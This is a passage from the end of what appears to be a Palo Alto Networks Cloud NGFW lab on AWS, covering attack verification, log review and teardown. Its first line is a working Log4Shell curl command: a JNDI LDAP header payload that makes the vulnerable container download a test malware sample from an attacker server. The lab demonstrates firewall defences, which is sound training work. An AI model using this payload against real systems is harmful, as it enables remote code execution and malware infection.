curl 10.0.0.10:8080 -H 'X-Api-Version: ${jndi:ldap://att-svr:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
```

96. You will get a “Hello, world!” message as a response indicating that the attack is successful.

![](https://lh5.googleusercontent.com/nFEEIa02sRhicmJFOl_pk-XQ3ZAI8AzJDKNVgFWCU7sMOnQcDRF9iv8UP5fPxPZVhehwRlZqUfcsBQDhXKIwQanRux1HluF9jky3NdkPQNpuyiUs8es5TLTNJYO1iqQNoNig_xjz6-WPhiHH_LtJhA)

97. Switch context to the **vul-app-server** SSH session and use the following commands to connect to the **vul-app-1 **container and view the /tmp directory. You will see that the vul-app server has been infected with malware.

```
sudo docker exec -it vul-app-1 /bin/sh
```

```
ls -alrt /tmp
```

![](https://lh5.googleusercontent.com/wDXixyTsMKEro1mx9hXN4snqToRVgFDSRDY5Vqj8r1LJvgKb4oxJqUEwhv1yfCqQRp7I2918YGw4wgYlMKVU3VKcYNsqivFmw6n_GOO6kw36n0G6f0jroR9vfO1aUVzdmChvKev_lbyuHodgi8oInzQ)

98. Verify the attack by checking the logs on CloudWatch. Navigate to the AWS Console browser tab, on the Search bar at the top of the page, type “cloudwatch” and select “CloudWatch” from the search results.
99. From the left menu, click on “Log groups” and from the list of Log groups, select “PaloAltoCloudNGFW”.

![](https://lh4.googleusercontent.com/NhHMFHA560c1XFo2XBLLESiqa16YBqh51v0F6AjvDApCP19vXeiIrR5UMtTm3G692Ox30bOCyj7yFeAdnxyRl-BRIlUi4FFXnSTsYOimRgX0wNkk-y-1WFCOb3Lm3Et59lJ8RYE1urcoYbG7lzfFM5w)

100. Open the TRAFFIC log file and you would see the sequence of a successful Log4J attack. Sessions on port 8080, 1389 and 8888.

![](https://lh5.googleusercontent.com/8hMPemMAJcDB2L1iBgOJw3zytcA4Hd9wBN9rK9vipv43xhy9L9c_ozIezHEonGVfa6g5KvNBkO1_WeDwX-GOJp_-RfjZjBCox75n2cWFtggQ_QFwswsDddk7qtvfKgutIzRNmoWRdPrjVSen-5ujoLA)

![](https://lh3.googleusercontent.com/0s3yG7299fXftitIBqgITrApBn15kw1-RLYvQMJo60tF7-DM_pMgtf7Hlfi-6Vrj9f-meCjS3ijqqZ6CDFFuiwyn00Bf_7JtQenSB_8AaW-Wn9V5E1LPDcnnso9TJxd2WrZhUTDlH10uK5CdO9i2Yls)

### Enable Best Practice Security profiles

To secure the East-West traffic once again, you can update the Security Profiles on the Rulestack back to _Best Practice_ and relaunch the attack. This time the attack will be blocked by CloudNGFW.

# Congratulations!!!

Congratulations,  you have successfully completed this Hands ON lab. As part of this lab you went through the process to SUBSCRIBE to Palo Alto CloudNGFW Service on AWS. You familiarize yourself with ways to DEPLOY the service to protect your application on AWS. And finally, you learned how to SECURE your environment with ‘Best Practices’ security profiles from Palo Alto Networks.

## Lab Teardown

### Unsubscribe from CloudNGFW Service

1. Navigate to the AWS Marketplace console. You can search for ‘market’ and click on ‘AWS Marketplace Subscriptions’.

![](https://lh4.googleusercontent.com/O5hgxnAoeoECZQ08ZRhA8gMvqFo2O3tpKKJkUzoAkVKmrHpmwvI9KXMeZdpawJgbu_-fF-dx0H6iQzZ4W4JJTt9N0DO9mgPc3MeLM2QYQJlS-O_rkE1wzGvZ9gU8WfkiOnEk0OEo67i774T_6oEy10A)

2. Click on ‘Cloud NGFW PAY-as…” service

![](https://lh3.googleusercontent.com/4aTSAiGs0nqdYUEYDuY-WaxvkjKc1xSGLsdyZpdTtdS9O6pzgbne3NUMTnlLhz7XHOcaJmOij_KlaEYbu6WaZzQI3E7aratcAcg2muuij9dGayEgCkjP7B2gvHkJL0EoiidW6-0almiUUi36PiezyQ4)

3. Click on ‘Action’ at the bottom of the page and click on ‘Cancel Subscription’

![](https://lh5.googleusercontent.com/G2u3Fh6Vcs8N3ropb_m1u5VSmqIfH-4Zc4CILY-F3R6VkwDYpXXy9SoxvA7rA8ZutG3m402tjmpp7_Ds-XCE8ktnn6xCSKryy3dKBCuP9jQKddB29op-XMJzmX7aBR_ktDLx2iDyrPJL32yLREsx1qI)

4. Select the checkbox to acknowledge and click on ‘Yes, cancel subscription’ 

![](https://lh3.googleusercontent.com/IUAPi4B9B-nT9da7P3P9SnvXiW014vR7FsRuAPy-vcpsQ7amLz9kjNRAmHxioV2SVqafs-c1sdeNCj7nkSfiPiGwYIwCXKUOdI_QEHRvbnbCEi-PzreZzT3nuVaBCG5jhU2yOHCnXKFUnKSqufJai2g)

![](https://lh6.googleusercontent.com/31pCarQ0Gty06az_aEBt0adXKWOjT_yhnYR33kug07SV73bZS1zUMotlqmuwTj5Cowipi7lcoI5atCx3OfFfSGxlBPyi3JmEFALcqPYAVqrg9J72m1esBhnH8AQcfuW1DVX59VSxJBNJcJD68U9Gb40)

5. You have successfully unsubscribed from the CloudNGFW service.

### Remove all the lab resources

6. Navigate to the CloudFormation console and select **Stacks** from the left menu.
7. Identify and Select the CFT Stack deployment that you created for the lab and Delete it.

**Note:** Make sure that you have delete permissions for all the lab resources before attempting delete. If you do not have the permissions then it is likely that the "Delete Stack" operation will fail.

# Resources and Reference

Here are links to some of the resources for CloudNGFW service.

- [eBook: Cloud NGFW - Palo Alto Networks](https://www.paloaltonetworks.com/resources/ebooks/cloud-ngfw)
- [Cloud NGFW: Solution Brief - Palo Alto Networks](https://www.paloaltonetworks.com/resources/whitepapers/cloud-ngfw-solution-brief)
- [Cloud NGFW for AWS Datasheet - Palo Alto Networks](https://www.paloaltonetworks.com/resources/datasheets/cloud-ngfw-for-aws)
- [AWS Marketplace: Palo Alto Networks Cloud NGFW (Next-Generation Firewall) Pay-As-You-Go](https://aws.amazon.com/marketplace/pp/prodview-sdwivzp5q76f4#:~:text=7%2DDay%20Free%20Trial%3A%20Click,Get%20started%20today)!
- [Getting Started with Cloud NGFW for AWS](https://docs.paloaltonetworks.com/cloud-ngfw/aws/cloud-ngfw-on-aws/getting-started-with-cloud-ngfw-for-aws)